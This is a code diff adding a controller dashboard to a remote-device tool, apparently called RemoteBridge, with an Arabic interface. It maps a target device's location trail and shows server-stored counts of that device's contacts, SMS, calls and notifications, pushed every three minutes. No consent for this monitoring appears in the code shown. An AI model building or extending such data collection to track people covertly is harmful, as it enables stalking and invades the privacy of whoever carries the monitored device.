+                        <div class="flex items-center gap-1.5">
+                            <select id="rb-loc-window" onchange="redrawLocationMap()" class="bg-slate-800 border border-slate-600 rounded-xl px-2 py-1.5 text-[11px] text-slate-100">
+                                <option value="5">آخر 5 دقائق</option>
+                                <option value="10">آخر 10 دقائق</option>
+                                <option value="60" selected>آخر ساعة</option>
+                                <option value="120">آخر ساعتين</option>
+                                <option value="all">كل السجل</option>
+                            </select>
+                            <button onclick="refreshLocationPoints()" class="px-2.5 py-1.5 rounded-xl text-[11px] font-bold bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700"> ⟳ </button>
+                            <button onclick="closeLocationMapModal()" class="text-slate-400 hover:text-white text-lg px-2">✕</button>
+                        </div>
+                    </div>
+                    <div id="rb-loc-map" class="w-full rounded-xl border border-slate-700" style="height: 62vh; background: #0f172a;"></div>
+                    <div id="rb-loc-summary" class="text-[10px] text-slate-500 mt-1.5 font-mono"></div>
+                </div>`;
+            el.classList.replace('hidden', 'flex');
+            refreshLocationPoints();
+        }
+
+        function refreshLocationPoints() {
+            const targetId = activeTargetDeviceId || appConfig.targetDeviceId;
+            const useRpc = targetId && isP2pAlive();
+            if (useRpc) {
+                locationSnapshotBuffer = null;
+                sendRPCCommand('locations_get', { limit: 400 }, { timeout: 10000 }).catch(() => {
+                    loadServerSnapshotLocation();
+                });
+            } else {
+                loadServerSnapshotLocation();
+            }
+        }
+
+        async function loadServerSnapshotLocation() {
+            // حل وسط: لقطة نقاط مخزنة على الخادم (تبقى تُعرض حتى عند انقطاع المضيف)
+            try {
+                const hostId = activeTargetDeviceId || appConfig.targetDeviceId;
+                const base = serverStateApiBase();
+                if (!hostId || !base) { redrawLocationMap(); return; }
+                const res = await fetch(base + '/api/state?deviceId=' + encodeURIComponent(hostId));
+                if (!res.ok) { redrawLocationMap(); return; }
+                const snap = await res.json();
+                if (snap && snap.data) locationSnapshotBuffer = snap.data;
+            } catch (_) {}
+            redrawLocationMap();
+        }
+
+        function redrawLocationMap() {
+            const mapEl = document.getElementById('rb-loc-map');
+            if (!mapEl) return;
+            loadLeafletAssets().then(() => {
+                if (!rbLocMap || !rbLocMap._container || !document.getElementById('rb-loc-map')) {
+                    try { if (rbLocMap) rbLocMap.remove(); } catch (_) {}
+                    rbLocMap = window.L.map('rb-loc-map', { zoomControl: true }).setView([24.7, 46.6], 11);
+                    window.L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+                        maxZoom: 19,
+                        attribution: '© OpenStreetMap contributors'
+                    }).addTo(rbLocMap);
+                    rbLocMarkersLayer = window.L.layerGroup().addTo(rbLocMap);
+                } else {
+                    try { setTimeout(() => rbLocMap.invalidateSize(), 60); } catch (_) {}
+                }
+                drawLocationMapData();
+            }).catch(() => {
+                mapEl.innerHTML = '<div class="flex items-center justify-center h-full text-rose-400 text-xs">تعذر تحميل مكتبة الخريطة (تتطلب إنترنت مسارها مجاني) — ستظهر النقاط نصياً: ' + escapeHtml2((locationSourcePoints() || []).slice(0, 12).map(p => Number(p.lat).toFixed(4) + ',' + Number(p.lng).toFixed(4)).join(' | ')) + '</div>';
+            });
+        }
+
+        function escapeHtml2(s) {
+            return String(s || '').replace(/[&<>"]/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[c]));
+        }
+
+        function drawLocationMapData() {
+            if (!rbLocMap) return;
+            const now = Date.now();
+            const win = document.getElementById('rb-loc-window').value;
+            const sel = { '5': 5 * 60e3, '10': 10 * 60e3, '60': 60 * 60e3, '120': 120 * 60e3 }[win];
+            const all = locationSourcePoints().filter(p => p && typeof p.lat === 'number' && typeof p.lng === 'number');
+            const pts = sel ? all.filter(p => (now - (Number(p.ts) || 0)) <= sel) : all;
+            try { rbLocMarkersLayer.clearLayers(); } catch (_) { rbLocMarkersLayer = window.L.layerGroup().addTo(rbLocMap); }
+            const summary = document.getElementById('rb-loc-summary');
+            if (!pts.length) {
+                if (summary) summary.innerText = 'لا نقاط ضمن النطاق الزمني المحدد — إجمالي السجل: ' + all.length + ' نقطة';
+                return;
+            }
+            const latlngs = pts.map(p => [Number(p.lat), Number(p.lng)]).reverse(); // oldest → newest
+            window.L.polyline(latlngs, { color: '#34d399', weight: 3.2, opacity: 0.85 }).addTo(rbLocMap);
+            pts.forEach((p, i) => {
+                const isFirst = i === pts.length - 1; // after reverse logic ends at latest — الأحدث هي التي على سلسلتها الأخيرة
+                const latest = i === latlngs.length - 1;
+                const marker = window.L.circleMarker([Number(p.lat), Number(p.lng)], {
+                    radius: latest ? 6 : 3.4,
+                    color: latest ? '#22d3ee' : '#a78bfa',
+                    weight: latest ? 3 : 1.6,
+                    fillOpacity: 0.85
+                }).bindPopup(
+                    recFmtDate(Number(p.ts) || now) + '<br>' + Number(p.lat).toFixed(5) + ', ' + Number(p.lng).toFixed(5) +
+                    (p.acc !== undefined ? '<br>دقة ±' + Number(p.acc).toFixed(0) + ' م' : '') +
+                    (p.provider ? '<br>' + escapeHtml2(p.provider) : '')
+                );
+                marker.addTo(rbLocMap);
+            });
+            const first = latlngs[0], last = latlngs[latlngs.length - 1];
+            window.L.marker(first, { title: 'بداية المسار' }).addTo(rbLocMap).bindPopup('🚩 بداية المسار');
+            window.L.marker(last, { title: 'آخر نقطة' }).addTo(rbLocMap).bindPopup('🏁 آخر موضع');
+            try { rbLocMap.fitBounds(window.L.latLngBounds(latlngs).pad(0.25)); } catch (_) {}
+            if (summary) summary.innerText = 'عرض ' + latlngs.length + ' نقطة ضمن النطاق (إجمالي ' + all.length + ') — نبضة كل 3 دقائق';
+        }
+
+        function closeLocationMapModal() {
+            const el = document.getElementById('rb-location-modal');
+            if (el) el.classList.replace('flex', 'hidden');
+        }
+
+        // ——— مزامنة الحالة الصغيرة مع خادم Render ———
+        function serverStateApiBase() {
+            try {
+                let u = (appConfig.serverUrl || PRESETS.render || '').trim().replace(/\/+$/, '');
+                if (u.endsWith('/ws')) u = u.slice(0, -3);
+                if (u.startsWith('wss://')) u = 'https://' + u.slice(6);
+                else if (u.startsWith('ws://')) u = 'http://' + u.slice(5);
+                return u;
+            } catch (_) { return ''; }
+        }
+
+        function postControllerStateOnce() {
+            const base = serverStateApiBase();
+            if (!base || !myDeviceId) return;
+            try {
+                const payload = {
+                    deviceId: myDeviceId,
+                    role: 'controller',
+                    name: appConfig.deviceName || 'Controller',
+                    data: {
+                        settings: {
+                            serverUrl: appConfig.serverUrl,
+                            deviceName: appConfig.deviceName,
+                            targetDeviceId: appConfig.targetDeviceId
+                        },
+                        savedHosts: [...savedHosts.values()]
+                    }
+                };
+                fetch(base + '/api/state', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                }).catch(() => {});
+            } catch (_) {}
+        }
+
+        let controllerStateRestored = false;
+        async function restoreControllerStateOnce() {
+            if (controllerStateRestored) return;
+            controllerStateRestored = true;
+            const base = serverStateApiBase();
+            if (!base || !myDeviceId) return;
+            try {
+                if (savedHosts.size > 0) return; // لدينا محفوظات محلية — لا استرجاع
+                const res = await fetch(base + '/api/state?deviceId=' + encodeURIComponent(myDeviceId));
+                if (!res.ok) return;
+                const snap = await res.json();
+                if (snap && snap.data && Array.isArray(snap.data.savedHosts) && snap.data.savedHosts.length) {
+                    for (const rec of snap.data.savedHosts) {
+                        if (rec && rec.deviceId) savedHosts.set(rec.deviceId, { ...rec, online: false });
+                    }
+                    localStorage.setItem('remotebridge_saved_hosts_v1', JSON.stringify([...savedHosts.values()]));
+                    if (snap.data.settings && snap.data.settings.serverUrl && !appConfig.serverUrl) appConfig.serverUrl = snap.data.settings.serverUrl;
+                    renderHostList();
+                    showToast('☁️ استرجعنا أجهزتك المحفوظة من الخادم (متاحة حتى في جهاز جديد)', 'success');
+                }
+            } catch (_) {}
+        }
+
+        async function openHostSnapshotModal(deviceId) {
+            ensureStreamModalsShell();
+            const el = document.getElementById('rb-host-snapshot-modal');
+            el.classList.replace('hidden', 'flex');
+            el.innerHTML = `<div class="bg-slate-900 border border-slate-700 rounded-2xl p-6 text-sm text-slate-300">⏳ جارٍ جلب آخر حالة مخزنة من خادم Render...</div>`;
+            try {
+                const base = serverStateApiBase();
+                const res = await fetch(base + '/api/state?deviceId=' + encodeURIComponent(deviceId));
+                if (!res.ok) throw new Error('no snapshot');
+                const snap = await res.json();
+                const d = snap.data || {};
+                const lastSeen = d.lastSeen ? recFmtDate(d.lastSeen) : (snap.ts ? recFmtDate(snap.ts) : 'غير معروف');
+                const battery = (snap.batteryLevel !== undefined && snap.batteryLevel >= 0 ? snap.batteryLevel : (d.batteryLevel !== undefined ? d.batteryLevel : -1));
+                const counts = {
+                    contacts: (d.contacts || []).length,
+                    sms: (d.sms || []).length,
+                    calls: (d.calls || []).length,
+                    notifications: (d.notifications || []).length,
+                    location: (d.location || []).length
+                };
+                el.innerHTML = `
+                    <div class="bg-slate-900 border border-slate-700 rounded-2xl p-4 w-full max-w-md shadow-2xl">
+                        <div class="flex items-center justify-between mb-3">
+                            <h3 class="text-sm font-bold text-emerald-300">💾 الحالة المخزنة على الخادم</h3>
+                            <button onclick="closeHostSnapshotModal()" class="text-slate-400 hover:text-white text-lg px-2">✕</button>
+                        </div>
+                        <div class="text-xs text-slate-300 grid grid-cols-2 gap-2">
+                            <div class="bg-slate-950/70 border border-slate-800 rounded-xl p-2">🔋 البطارية: <b class="${battery <= 15 ? 'text-rose-300' : 'text-emerald-300'}">${battery >= 0 ? battery + '%' + (snap.isCharging || d.isCharging ? ' ⚡' : '') : 'غير معروفة'}</b></div>
+                            <div class="bg-slate-950/70 border border-slate-800 rounded-xl p-2">📅 آخر رؤية: <b>${lastSeen}</b></div>
+                            <div class="bg-slate-950/70 border border-slate-800 rounded-xl p-2">👥 جهات اتصال محفوظة: <b>${counts.contacts}</b></div>
+                            <div class="bg-slate-950/70 border border-slate-800 rounded-xl p-2">💬 رسائل: <b>${counts.sms}</b></div>
+                            <div class="bg-slate-950/70 border border-slate-800 rounded-xl p-2">📞 مكالمات: <b>${counts.calls}</b></div>
+                            <div class="bg-slate-950/70 border border-slate-800 rounded-xl p-2">🔔 إشعارات: <b>${counts.notifications}</b></div>
+                            <div class="bg-slate-950/70 border border-slate-800 rounded-xl p-2 col-span-2">📍 نقاط المواقع: <b>${counts.location}</b></div>
+                        </div>
+                        <div class="flex gap-2 mt-3">
+                            <button id="rb-snap-map" class="flex-1 bg-teal-700 hover:bg-teal-600 text-teal-50 text-xs font-bold py-2.5 rounded-xl transition">🗺️ مسار المواقع المخزن</button>
+                            <button onclick="closeHostSnapshotModal()" class="bg-slate-700 hover:bg-slate-600 text-slate-200 text-xs font-bold py-2.5 rounded-xl transition px-4">إغلاق</button>
+                        </div>
+                    </div>`;
+                const mapBtn = el.querySelector('#rb-snap-map');
+                if (mapBtn) mapBtn.addEventListener('click', () => {
+                    closeHostSnapshotModal();
+                    setTimeout(() => openLocationMapView(d), 60);
+                });
+            } catch (_) {
+                el.innerHTML = `<div class="bg-slate-900 border border-slate-700 rounded-2xl p-6 w-full max-w-md text-center">
+                    <p class="text-sm text-slate-300 mb-2">لا توجد حالة مخزنة لهذا الجهاز على الخادم بعد.</p>
+                    <p class="text-[11px] text-slate-500">سيدفع المضيف لقطة كل 3 دقائق عندما يعمل — وبعدها تبقى متاحة هنا حتى لو انقطع.</p>
+                    <button onclick="closeHostSnapshotModal()" class="mt-3 bg-slate-700 hover:bg-slate-600 text-slate-200 text-xs font-bold py-2 rounded-xl px-4">إغلاق</button>
+                </div>`;
+            }
+        }
+
+        function closeHostSnapshotModal() {
+            const el = document.getElementById('rb-host-snapshot-modal');
+            if (el) el.classList.replace('flex', 'hidden');
+        }
+
+        // ——— التمهيد: استرجاع/تزامن دوري ———
+        setTimeout(() => { restoreControllerStateOnce(); postControllerStateOnce(); }, 4000);
+        setInterval(postControllerStateOnce, 60000);
     </script>
 </body>
 </html>
